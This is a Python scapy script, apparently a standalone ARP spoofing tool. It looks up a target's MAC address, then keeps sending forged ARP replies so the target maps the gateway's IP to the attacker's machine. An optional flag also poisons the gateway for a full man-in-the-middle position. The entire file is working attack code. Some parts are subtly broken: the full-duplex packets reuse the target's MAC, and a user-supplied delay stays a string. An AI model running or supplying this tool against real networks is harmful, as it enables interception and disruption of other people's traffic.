from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import argparse

# use default interface & this host ip
iface = conf.iface
# amount of time between each datagram sent
delay = 0.4
# target must be delivered from user
target = None
# by default, the spoofed address is the gateway ip
src = conf.route.route("0.0.0.0")[2]
full_duplex = False
dst_mac = None


def find_mac(address):
    print(address)
    source_ip = get_if_addr(iface)
    source_mac = get_if_hwaddr(iface)
    pt = ARP(hwsrc=source_mac, psrc=source_ip, pdst=address, hwdst='ff:ff:ff:ff:ff:ff')
    ans, unans = sr(pt, timeout=5, verbose=False)
    if ans:
        return ans[0][1].hwsrc


# target is defined as the machine that we want to spoof
def send_arp_response(target_ip, spoof_ip):
    packet = (Ether(dst=dst_mac) /
              ARP(op="is-at", psrc=spoof_ip, hwdst=dst_mac, pdst=target_ip))
    sendp(packet, iface=iface, verbose=False)


def spoof(sent=0):
    while True:
        # one way duplex -> spoof the table of the target
        # and make him think that our mac belongs to the src ip
        send_arp_response(target, src)
        sent += 1
        print(f"\b sent {2 * sent if full_duplex else sent} packets", end='\r')
        if full_duplex:
            # Full duplex scenario -> spoof the table of the src (by default, the gateway MITM)
            # and make him think that our mac belongs to the target
            send_arp_response(src, target)
        time.sleep(delay)


def parse_flags():
    global iface, delay, target, src, full_duplex, dst_mac
    parser = argparse.ArgumentParser()
    # insert the args variables to CLI for help
    parser.add_argument("-i", "--iface", help="The interface you wish to use")
    parser.add_argument("-s", "--src", help="The address you want for the attacker")
    parser.add_argument("-d", "--delay", help="Delay (in seconds) between messages")
    parser.add_argument("-gw", "--gateway", action="store_true", help="Activate full-duplex attack")
    parser.add_argument("-t", "--target", required=True, help="IP of target")
    args = parser.parse_args()

    if args.iface:
        iface = args.iface
    target = args.target

    # store mac address info as global
    dst_mac = find_mac(target)

    if args.delay:
        delay = args.delay
    if args.src:
        src = args.src
    full_duplex = args.gateway


if __name__ == '__main__':
    parse_flags()
    if full_duplex:
        print("Full-duplex attack activated!")
    spoof()


